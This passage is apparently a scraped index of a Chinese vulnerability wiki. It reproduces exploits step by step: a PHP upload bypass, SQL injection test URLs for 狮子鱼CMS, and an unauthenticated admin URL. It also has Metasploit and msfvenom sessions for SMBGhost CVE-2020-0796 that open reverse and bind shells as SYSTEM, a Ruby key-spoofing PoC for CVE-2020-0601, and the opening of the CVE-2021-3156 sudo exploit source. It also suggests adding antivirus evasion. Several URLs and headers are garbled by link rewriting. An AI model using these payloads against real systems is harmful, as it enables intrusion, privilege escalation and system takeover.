Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif 即可绕过上传PHP文件 POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2 Host: Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs Content-Length: 208 ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"files\"; filename=\"test.php\" Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif ------WebKitFormBoundary8UaANmWAgM4BqBSs— 访问返回的文件路径 /Common/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/xxxxx.php 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/狮子鱼CMS/狮子鱼CMS ApigoodController.class.php SQL注入漏洞.html":{"url":"book/CMS漏洞/狮子鱼CMS/狮子鱼CMS ApigoodController.class.php SQL注入漏洞.html","title":"狮子鱼CMS ApigoodController.class.php SQL注入漏洞","keywords":"","body":"狮子鱼CMS ApigoodsController.class.php SQL注入漏洞 漏洞描述 狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞 漏洞影响 [!NOTE] 狮子鱼CMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" 漏洞复现 登录页面如下 存在漏洞的文件为 ApigoodsController.class.php , 关键位置为 public function get_goods_detail() { $id = I('get.id'); $pin_id = I('get.pin_id', 0); $token = I('get.token'); $weprogram_token = M('weprogram_token')->field('member_id')->where( array('token' =>$token) )->find(); $member_id = $weprogram_token['member_id']; $need_data = array(); $sql = \"select g.*,gd.description,gd.is_untake_level,level_discount,gd.video_src,gd.video_size_width,gd.vedio_size_height,gd.is_video, gd.summary,gd.share_title,gd.activity_summary,gd.tag from \" . C('DB_PREFIX') . \"goods g,\" . C('DB_PREFIX') . \"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\" . $id; $goods = M()->query($sql); $pin_model = D('Home/Pin'); $goods_model = D('Home/Goods'); $qian = array( \"/Uploads/image\" ); $c_site_url = str_replace('/dan','',C('SITE_URL')); $hou = array( $c_site_url . \"/Uploads/image\" ); $goods[0]['video_src'] = C('SITE_URL').\"Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/\".$goods[0]['video_src']; $goods[0]['description'] = str_replace($qian, $hou, $goods[0]['description']); $goods[0]['description'] = htmlspecialchars_decode($goods[0]['description']); $qian = array( \"\\r\\n\" ); 漏洞测试为 https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/狮子鱼CMS/狮子鱼CMS ApiController.class.php SQL注入漏洞.html":{"url":"book/CMS漏洞/狮子鱼CMS/狮子鱼CMS ApiController.class.php SQL注入漏洞.html","title":"狮子鱼CMS ApiController.class.php SQL注入漏洞","keywords":"","body":"狮子鱼CMS ApiController.class.php SQL注入漏洞 漏洞描述 狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞 漏洞影响 [!NOTE] 狮子鱼CMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" 漏洞复现 登录页面如下 存在漏洞的文件为 ApiController.class.php , 关键位置为 public function goods_detail() { $goods_id = I('get.goods_id'); //gallery =>img_url //goods goods.goods_desc goods_name group_price market_price sell_count group_number $sql=\"select g.*,gd.description,gd.summary,gd.tag from \". C('DB_PREFIX').\"goods g,\".C('DB_PREFIX').\"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\".$goods_id; $goods_arr=M()->query($sql); $qian=array(\"\\r\\n\"); $hou=array(\"\"); $goods_arr[0]['summary'] = str_replace($qian,$hou,$goods_arr[0]['summary']); $sql=\"select image from \".C('DB_PREFIX').\"goods_image where goods_id=\".$goods_id; $goods_image=M()->query($sql); $gallery = array(); $default_image = ''; foreach($goods_image as $val) { $val['img_url'] = str_replace('http','https',C('SITE_URL')).'/Uploads/ http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/'.$val['image']; if(empty($default_image)) { $default_image = str_replace('http','https',C('SITE_URL')).resize($val['image'], C('goods_thumb_width'), C('goods_thumb_height')); } $gallery[] = array('img_url' => $val['img_url']); } $goods = $goods_arr[0]; 漏洞测试为 https://xxx.xxx.xx.xxx/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/原创先锋/":{"url":"book/CMS漏洞/原创先锋/","title":"原创先锋","keywords":"","body":"原创先锋 原创先锋 后台管理平台 未授权访问漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/CMS漏洞/原创先锋/原创先锋 后台管理平台 未授权访问漏洞.html":{"url":"book/CMS漏洞/原创先锋/原创先锋 后台管理平台 未授权访问漏洞.html","title":"原创先锋 后台管理平台 未授权访问漏洞","keywords":"","body":"原创先锋 后台管理平台 未授权访问漏洞 漏洞描述 原创先锋 后台管理平台 存在未授权访问漏洞，攻击者通过漏洞可以任意接管账户权限 漏洞影响 [!NOTE] 原创先锋 后台管理平台 FOFA [!NOTE] body=\"https://www.bjycxf.com\" 漏洞复现 后台登陆页面如下 未授权的Url /admin/admin/admin_list.html 点击添加并授权即可获取后台模块权限 参考文章 http://www.0dayhack.net/index.php/1693/ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/":{"url":"book/操作系统漏洞/","title":"操作系统漏洞","keywords":"","body":"操作系统漏洞🐺 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Windows/":{"url":"book/操作系统漏洞/Windows/","title":"Windows","keywords":"","body":"Windows Windows CryptoAPI欺骗漏洞 CVE-2020-0601 Windows SMB远程代码执行漏洞 CVE-2020-0796 Windows Win32k 本地提权漏洞 CVE-2021-1732 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Windows/Scan/":{"url":"book/操作系统漏洞/Windows/Scan/","title":"扫描工具","keywords":"","body":"扫描工具 CVE-2020-0796 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Windows/Scan/扫描工具 CVE-2020-0796.html":{"url":"book/操作系统漏洞/Windows/Scan/扫描工具 CVE-2020-0796.html","title":"扫描工具 CVE-2020-0796","keywords":"","body":"扫描工具 CVE-2020-0796 Scan目录以放针对 CVE-2020-0796 4种不同利用方式的POC 奇安信 CVE-2020-0796 扫描下载 Github CVE-2020-0796 蓝屏EXP 下载 Github CVE-2020-0796 本地提权EXP 下载 Github CVE-2020-0796 RCE EXP 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Windows/Windows SMB远程代码执行漏洞 CVE-2020-0796.html":{"url":"book/操作系统漏洞/Windows/Windows SMB远程代码执行漏洞 CVE-2020-0796.html","title":"Windows SMB远程代码执行漏洞 CVE-2020-0796","keywords":"","body":"Windows SMB远程代码执行漏洞 CVE-2020-0796 漏洞描述 2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码 漏洞影响 [!NOTE] SMB版本 v3.1.1 Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) 环境搭建 在MSDN上下载对应的存在漏洞的系统版本 安装后执行命令 winver 查看系统版本，并查看是否含有 KB4551762补丁 漏洞复现 漏洞原理 CVE-2020-0796漏洞存在于受影响版本的Windows驱动srv2.sys中。Windows SMB v3.1.1 版本增加了对压缩数据的支持。图2所示为带压缩数据的SMB数据报文的构成。 ProtocolId：4字节，固定为0x424D53FC OriginalComressedSegmentSize：4字节，原始的未压缩数据大小 CompressionAlgorithm：2字节，压缩算法 Flags：2字节，详见协议文档 Offset/Length：根据Flags的取值为Offset或者Length，Offset表示数据包中压缩数据相对于当前结构的偏移 srv2.sys中处理SMBv3压缩数据包的解压函数Srv2DecompressData未严格校验数据包中OriginalCompressedSegmentSize和Offset/Length字段的合法性。而这两个字段影响了Srv2DecompressData中内存分配函数SrvNetAllocateBuffer的参数。如图4所示的Srv2DecompressData函数反编译代码，SrvNetAllocateBuffer实际的参数为OriginalCompressedSegmentSize+Offset。这两个参数都直接来源于数据包中SMB Compression Transform Header中的字段，而函数并未判断这两个字段是否合法，就直接将其相加后作为内存分配的参数(unsigned int类型）。 这里，OriginalCompressedSegmentSize+Offset可能小于实际需要分配的内存大小，从而在后续调用解压函数SmbCompressionDecompress过程中存在越界读取或者写入的风险。 目前已公开的针对该漏洞的本地提权利用包含如下的主要过程： （1）验证程序首先创建到SMS server的会话连接（记为session）。 （2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。 （3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。 （4） SMS server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。 （5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。 首先，看一下已公开利用的evilData数据包 数据包的内容很简单，其中几个关键字段数据如下： OriginalSize ：0xffffffff Offset：0x10 Real compressed data ：13字节的压缩数据，解压后应为1108字节’A’加8字节的token地址。 SMB3 raw data ：实际上是由2个8字节的0x1FF2FFFFBC（总长0x10)加上0x13字节的压缩数据组成 从上面的漏洞原理分析可知，漏洞成因是Srv2DecompressData函数对报文字段缺乏合法性判断造成内存分配不当。在该漏洞数据包中，OriginalSize 是一个畸形值。OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf 是一个很小的值，其将会传递给SrvNetAllocateBuffer进行调用，下面具体分析内存分配情况。SrvNetAllocateBuffer的反编译代码 由于传给SrvNetAllocateBuffer的参数为0xf，根据SrvNetAllocateBuffer的处理流程可知，该请求内存将从SrvNetBufferLookasides表中分配。这里需要注意的是，变量SrvDisableNetBufferLookAsideList跟注册表项相关，系统默认状态下SrvDisableNetBufferLookAsideList为0。 SrvNetBufferLookasides表通过函数SrvNetCreateBuffer初始化，实际SrvNetCreateBuffer循环调用了SrvNetBufferLookasideAllocate分配内存，调用SrvNetBufferLookasideAllocate的参数分别为[‘0x1100’, ‘0x2100’, ‘0x4100’, ‘0x8100’, ‘0x10100’, ‘0x20100’, ‘0x40100’, ‘0x80100’, ‘0x100100’]。在这里，内存分配参数为0xf，对应的lookaside表为0x1100大小的表项。 SrvNetBufferLookasideAllocate函数实际是调用SrvNetAllocateBufferFromPool来分配内存 在函数SrvNetAllocateBufferFromPool中，对于用户请求的内存分配大小，内部通过ExAllocatePoolWithTag函数分配的内存实际要大于请求值（多出部分用于存储部分内存相关数据结构）。以请求分配0x1100大小为例，经过一系列判断后，最后分配的内存大小allocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)。 内存分配完毕之后，SrvNetAllocateBufferFromPool函数还对分配的内存进行了一系列初始化操作，最后返回了一个内存信息结构体指针作为函数的返回值。 这里需要注意如下的数据关系：SrvNetAllocateBufferFromPool函数返回值return_buffer指向一个内存数据结构，该内存数据结构起始地址同实际分配内存（函数ExAllocatePoolWithTag分配的内存）起始地址的的偏移为0x1150；return_buffer+0x18位置指向了实际分配内存起始地址偏移0x50位置处，而最终return_buffer会作为函数SrvNetAllocateBuffer的返回值 回到漏洞解压函数Srv2DecompressData，在进行内存分配之后，Srv2DecompressData调用函数SmbCompressionDecompress开始解压被压缩的数据 实际上，该函数调用了Windows库函数RtlDecompressBufferEx2来实现解压，根据RtlDecompressBufferEx2的函数原型来对应分析SmbCompressionDecompress函数的各个参数。 SmbCompressionDecompress(CompressAlgo，//压缩算法 Compressed_buf，//指向数据包中的压缩数据 Compressed_size，//数据包中压缩数据大小，计算得到 UnCompressedBuf,//解压后的数据存储地址，*(alloc_buffer+0x18)+0x10 UnCompressedSize,//压缩数据原始大小,源于数据包OriginalCompressedSegmentSize FinalUnCompressedSize)//最终解压后数据大小 从反编译代码可以看出，函数SmbCompressionDecompress中保存解压后数据的地址为*(alloc_buffer+0x18)+0x10的位置，根据内存分配过程分析，alloc_buffer + 0x18指向了实际内存分配起始位置偏移0x50处，所以拷贝目的地址为实际内存分配起始地址偏移0x60位置处。 在解压过程中，压缩数据解压后将存储到这个地址指向的内存中。根据evilData数据的构造过程，解压后的数据为占坑数据和tokenAddr。拷贝到该处地址后，tokenAddr将覆盖原内存数据结构中alloc_buffer+0x18处的数据。也就是解压缩函数SmbCompressionDecompress返回后，alloc_buffer+0x18将指向验证程序的tokenAddr内核地址 继续看Srv2DecompressData的后续处理流程，解压成功后，函数判断offset的结果不为0。不为0则进行内存移动，内存拷贝的参数如下： memmove(*(alloc_buffer+0x18)，SMB_payload，offset) 此时alloc_buffer+0x18已经指向验证程序的tokenAddr内核地址，而SMB_payload此时指向evilData中的权限数据，offset则为0x10。因此，这个内存移动完成后，权限数据将写入tokenAddr处。这意味着，SMS Server成功修改了验证程序的权限，从而实现了验证程序的提权！ 还有一个细节需要注意，在解压时，Srv2DecompressData函数会判断实际的解压后数据大小FinalUnCompressedSize是否和数据包中原始数据大小OriginalCompressedSegmentSize一致 按理来说实际解压后的数据大小为0x1100，不等于数据包中的原始压缩数据大小0xffffffff，这里应该进入到后面内存释放的流程。然而，实际上在函数SmbCompressionDecompress中，调用RtlDecompressBufferEx2成功后会直接将OriginalCompressedSegmentSize赋值给FinalUnCompressedSize。这也是该漏洞关于任意地址写入成功的关键之一。 CVE-2020-0796 目标探测(奇安信) 使用奇安信的漏洞扫描来探测 奇安信 CVE-2020-0796 扫描下载 CVE-2020-0796 蓝屏EXP Github CVE-2020-0796 蓝屏EXP 下载 运行脚本后目标成功蓝屏 CVE-2020-0796 本地提权EXP Github CVE-2020-0796 本地提权EXP 下载 运行应用程序后弹出cmd窗口为 system权限 或者使用 MSF的内置EXP windows/local/cve_2020_0796_smbghost 来本地提权 msf6 exploit(multi/handler) > set lhost 192.168.142.19 lhost => 192.168.142.19 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Sending stage (200262 bytes) to 192.168.142.61 [*] Meterpreter session 2 opened (192.168.142.19:4444 -> 192.168.142.61:51757) at 2020-11-08 15:28:20 +0800 meterpreter > meterpreter > getuid Server username: DESKTOP-RL1VAD8\\wy meterpreter > background msf6 exploit(multi/handler) > search cve_2020 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/sap/cve_2020_6287_ws_add_user 2020-07-14 normal Yes SAP Unauthenticated WebService User Creation 1 exploit/linux/misc/cve_2020_13160_anydesk 2020-06-16 normal Yes AnyDesk GUI Format String Write 2 exploit/windows/local/cve_2020_0668_service_tracing 2020-02-11 excellent No Service Tracing Privilege Elevation Vulnerability 3 exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 2020-03-10 excellent Yes Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability 4 exploit/windows/local/cve_2020_0796_smbghost 2020-03-13 good Yes SMBv3 Compression Buffer Overflow Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/cve_2020_0796_smbghost msf6 exploit(multi/handler) > use 4 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/cve_2020_0796_smbghost) > show options Module options (exploit/windows/local/cve_2020_0796_smbghost): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.142.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 10 v1903-1909 x64 msf6 exploit(windows/local/cve_2020_0796_smbghost) > set session 2 session => 2 msf6 exploit(windows/local/cve_2020_0796_smbghost) > check [*] The target appears to be vulnerable. msf6 exploit(windows/local/cve_2020_0796_smbghost) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Launching notepad to host the exploit... [+] Process 908 launched. [*] Reflectively injecting the exploit DLL into 908... [*] Injecting exploit into 908... [*] Exploit injected. Injecting payload into 908... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (200262 bytes) to 192.168.142.61 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM CVE-2020-0796 RCE EXP Github CVE-2020-0796 RCE EXP msfvenom生成reversed shellcode msfvenom -p windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py 将生成exp.py中的shellcode替换exploit.py中的shellcode [!NOTE] buf 要替换为 USER_PAYLOAD 使用 MSF msf5 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp payload => windows/x64/meterpreter/bind_tcp msf5 exploit(multi/handler) > set lport 2333 lport => 2333 msf5 exploit(multi/handler) > set rhost 192.168.1.110 rhost => 192.168.1.110 msf5 exploit(multi/handler) > exploit 执行脚本即可 python3 exploit.py -ip 192.168.1.110 [!NOTE] 注意有蓝屏概率 参考文章 Windows SMB Ghost（CVE-2020-0796）漏洞分析 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Windows/Windows CryptoAPI欺骗漏洞 CVE-2020-0601.html":{"url":"book/操作系统漏洞/Windows/Windows CryptoAPI欺骗漏洞 CVE-2020-0601.html","title":"Windows CryptoAPI欺骗漏洞 CVE-2020-0601","keywords":"","body":"Windows CryptoAPI欺骗漏洞 CVE-2020-0601 漏洞描述 1月15日，微软发布了针对CVE-2020-0601的安全补丁，该漏洞是微软在实现椭圆曲线加密算法数字证书验证时产生，可被利用于伪造来自可信任来源的签名或证书，并且因其业务特性会衍生出多种攻击向量，具有极高的可利用价值和极大的潜在破坏力，Win 10和windows server 2016 & 2019也都在其影响范围内。该漏洞由美国NSA国家安全局发现后汇报给微软公司，也被认为是第一个NSA公开披露的软件系统漏洞，当然也有可能存在其特殊的战术目的。绿盟科技M01N攻击安全研究团队对此漏洞原理进行了详细分析并复现了多种可能的攻击方法，提出了详细的检测及整改方案。 影响版本 [!NOTE] 带有指定参数的ECC密钥的证书的Microsoft Windows版本 依赖于Windows CryptoAPI的应用程序 漏洞复现 漏洞原理 CVE-2020-0601的根源是微软的加密库crypt32.dll中椭圆曲线加密算法的实现问题，首先我们来了解一下椭圆加密算法的基本原理。 要形象地理解椭圆曲线加密算法，可以结合图形来看，以下是一个符合椭圆曲线的方程y2 = x3 + ax + b，图像如下： 椭圆曲线具有的一些独特的性质使它适合用于加密算法： 椭圆曲线关于x轴对称 任何一条非垂直的线与曲线最多有三个点相交 曲线是光滑的，即曲线的所有点都没有两个或者两个以上的不同的切线 在椭圆曲线上任意两点A、B（若A、B重合则作A的切线），作直线交于椭圆曲线另一点C，过C做y轴的平行线与椭圆曲线交于C点，定义A+B=C。椭圆曲线的加法符合交换律和结合律。 如果A、B是同一个点，则过A作椭圆曲线的切线，以同样的方法得到对应的结果 C=2A 。 接下来是椭圆曲线加密相关的重点，如果对多个A进行累加,则可依次累加连线得到nA的值 。 起点为A，终点D=3A，阶为3 。 起点为A，终点G=4A，阶为4。 椭圆曲线加密 考虑K=kG，其中K、G为椭圆曲线Ep(a,b)上的点，n为G的阶。k为小于n的整数。则给定k和G，根据加法法则，计算K很容易（只要逐次求解）但反过来，给定K和G，求k就非常困难。因为实际使用中的ECC原则上把私钥k取得相当大，n也相当大，且椭圆曲线不再连续而是在实数内离散的值，要把n个解点逐一算出几乎是不可能的。这就是椭圆曲线加密算法的数学依据 。 点G称为基点 k(k K为公开密钥 椭圆曲线加密算法（ECC）和RSA一样是一种公开密钥加密技术，对原始数据以公钥加密，以私钥解密，即便攻击者获取密文和公钥也无法（在合理的时间或代价下）解密获取明文。 同样的，椭圆曲线加密算法（ECC）也被用于数字签名，以私钥加密生成签名，以公钥解密验证签名，如果和原文一样则签名验证成功。 公开密钥加密之所以可靠是因为它们利用了公钥密码领域的单向函数原理，正向操作非常简单，而逆向操作非常困难。 由G（基点）出发，进行k（私钥）次变换，只要按部就班地计算，就能很容易地得到终点K（公钥）的值。 已知起点G（基点）和终点K（公钥），要逆推得到移动次数k（私钥）则是一个很难的问题（最佳算法也达到了全指数复杂度） 相比传统RSA加密算法，椭圆加密算法具有着天生的优势，椭圆加密算法的逆向过程相比RSA有着更大的时间复杂度。在密钥长度相同的情况下，椭圆加密算法相比RSA具有更好的安全强度。一般认为，160比特的椭圆曲线密钥即可提供与1024比特的RSA密钥相当的安全强度。 较短的密钥也意味着更少的存储空间、更快的加解密速度和更少的带宽消耗，正因为椭圆加密算法的这些优势，它被用于Windows的签名系统、https的证书、比特币系统和中国的二代身份证系统中。 虽然椭圆曲线加密算法具有着许多优势，纯算法角度破解难度极大，微软对此算法的实现的缺漏却给漏洞利用提供了可乘之机。回到椭圆曲线加密最基本的等式 K=kG，首先需要明确的是，虽然对于给定的基点G和公钥K，要求解私钥k很困难，但是如果可以任意指定基点G，要构造一对k和G使等式成立却极其简单；最简单的情况，令基点G=K，则私钥k=1，这样一对基点和私钥可以使等式成立，也是有效的解。 在正常的标准椭圆曲线算法中，基点G并不是随意指定的，而是有固定的值（标准的作用，便是对基点G等参数的选择做出规定），例如在secp256r1版本的椭圆曲线算法中，基点G应当为标准规定的固定值，如果对参数不加验证，使得用户可以自定义传入的基点G的值（作为函数的参数），上面的私钥k=1的特殊解即可成立。 在有漏洞版本的crypt32.dll中验证使用ECC算法签名部分的函数恰恰是这个情况，原先的函数未加参数验证，参与计算的基点G的内容由被验证的证书随意指定，使未授权的证书能够构建私钥k=1的特殊解来成功通过椭圆加密算法的签名验证的过程。 让我们以CVE-2020-0601的一个POC为例来解析虚假密钥的构建过程： require 'openssl' raw = File.read ARGV[0] # 读取使用ECC算法的证书文件 ca = OpenSSL::X509::Certificate.new(raw) # 读取使用ECC算法的证书 ca_key = ca.public_key # 从证书中提取公钥ca_key ca_key.private_key = 1 # 设置私钥为1，使得公钥K==1*基点G的等式成立 group = ca_key.group group.set_generator(ca_key.public_key, group.order, group.cofactor) group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE ca_key.group = group # 利用构建的假基点G和假密钥k设置新group File.open(\"spoofed_ca.key\", 'w') { |f| f.write ca_key.to_pem } # 将新的group写入文件 修补后的Crypt32.dll中椭圆曲线加密算法的函数已加入了参数验证的部分，解决了由自由指定参数G导致的构造第二个特殊的有效密钥的问题。 一处验证机制的失误导致信任链的连锁反应。 现代的安全系统中存在着“信任链”的概念，信任链的上下级存在一种类似单向担保的关系，子级证书的可靠性由签名其的父级证书担保。签名时由根证书开始一级级向下签名，验证时则逐层溯源验证，直到找到信任的根证书文件，构成了一条信任链。位于整个“信任链”最上方的是最为重要不需要自证身份的根证书。根证书一般随系统附带或由管理员安装在系统内。 这个漏洞的存在则使得构造的无效签名通过了验证机制，使本应断裂的信任链被利用，逐级担保继续下去，最终使非法内容获得了证书所有者的合法签名身份。 漏洞利用 https://github.com/ollypwn/CurveBall 参考文章 cve-2020-0601-windows-cryptoapi欺骗漏洞分析 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Windows/Windows Win32k 本地提权漏洞 CVE-2021-1732.html":{"url":"book/操作系统漏洞/Windows/Windows Win32k 本地提权漏洞 CVE-2021-1732.html","title":"Windows Win32k 本地提权漏洞 CVE-2021-1732","keywords":"","body":"Windows Win32k 本地提权漏洞 CVE-2021-1732 漏洞描述 2021年2月10日，微软每月的例行补丁包中修复了一个Windows系统本地提权漏洞，本地攻击者可以利用此漏洞提升到system权限，据称此漏洞被用于定向攻击活动。 奇安信息威胁情报中心红雨滴团队第一时间跟进该漏洞并确认其可用性，漏洞相应的利用程序已经公开，有可能被改造来执行大范围的攻击，已经构成现实的威胁。目前微软已经修补了此漏洞，奇安信息威胁情报中心提醒相关用户及时安装2月补丁。 漏洞影响 [!NOTE] Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows Server, version 1909 (Server Core installation) Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems 漏洞复现 这里使用腾讯云的Windows 2019 Server 搭建环境 目前EXP已经公开了 [!NOTE] 公众号发送 CVE-2021-1732 可以获取编译好的 EXP Github公开地址:https://github.com/KaLendsi/CVE-2021-1732-Exploit 厉害的师傅可以做一下免杀，现在一上传就会被杀了 上传到服务器运行, 此时是以System权限运行 [!NOTE] 有蓝屏概率，使用谨慎点撒 CVE-2021-1723 whoami 参考文章 https://mp.weixin.qq.com/s/Ato-oKmNeyziXkKCr8d4kg 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Linux/":{"url":"book/操作系统漏洞/Linux/","title":"Linux","keywords":"","body":"Linux Linux sudo权限提升漏洞 CVE-2021-3156 Linux kernel权限提升漏洞 CVE-2021-3493 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/操作系统漏洞/Linux/Linux sudo权限提升漏洞 CVE-2021-3156.html":{"url":"book/操作系统漏洞/Linux/Linux sudo权限提升漏洞 CVE-2021-3156.html","title":"Linux sudo权限提升漏洞 CVE-2021-3156","keywords":"","body":"Linux sudo权限提升漏洞 CVE-2021-3156 漏洞描述 2021年1月26日，Linux安全工具sudo被发现严重的基于堆缓冲区溢出漏洞。利用这一漏洞，攻击者无需知道用户密码，一样可以获得root权限，并且是在默认配置下。此漏洞已分配为CVE-2021-3156，危险等级评分为7分。 当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。 漏洞影响 Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 漏洞复现 [!NOTE] 目前POC已经在Github公开 Linux sudo权限提升漏洞 CVE-2021-3156 当前可以验证的Linux环境为 Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28 [!NOTE] 这里使用腾讯云中的Ubuntu镜像进行复现 使用命令 漏洞利用POC [!NOTE] POC目录已经加入漏洞利用代码 另一个无交互式shell使用的脚本 https://github.com/Rvn0xsy/CVE-2021-3156-plus Makefile all: rm -rf libnss_X mkdir libnss_X gcc -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c clean: rm -rf libnss_X sudo-hax-me-a-sandwich hax.c /** ** CVE-2021-3156 PoC by blasty ** =========================================== ** ** Exploit for that sudo heap overflow thing everyone is talking about. ** This one aims for singleshot. Does not fuck with your system files. ** No warranties. ** ** Shout outs to: ** Qualys - for pumping out the awesome bugs ** lockedbyte - for coop hax. (shared tmux gdb sessions ftw) ** dsc - for letting me rack up his electricity bill ** my wife - for all the quality time we had to skip ** ** Enjoy! ** ** -- blasty // 20210130 **/ #include #include #include #include #include #include // 512 environment variables should be enough for everyone #define MAX_ENVP 512 typedef struct { char *target_name; char *sudoedit_path; uint32_t smash_len_a; uint32_t smash_len_b; uint32_t null_stomp_len; uint32_t lc_all_len; } target_t; target_t targets[] = { { .target_name = \"Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\", .sudoedit_path = \"/usr/bin/sudoedit\", .smash_len_a = 56, .smash_len_b = 54, .null_stomp_len = 63, .lc_all_len = 212 }, { .target_name = \"Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\", .sudoedit_path = \"/usr/bin/sudoedit\", .smash_len_a = 64, .smash_len_b = 49, 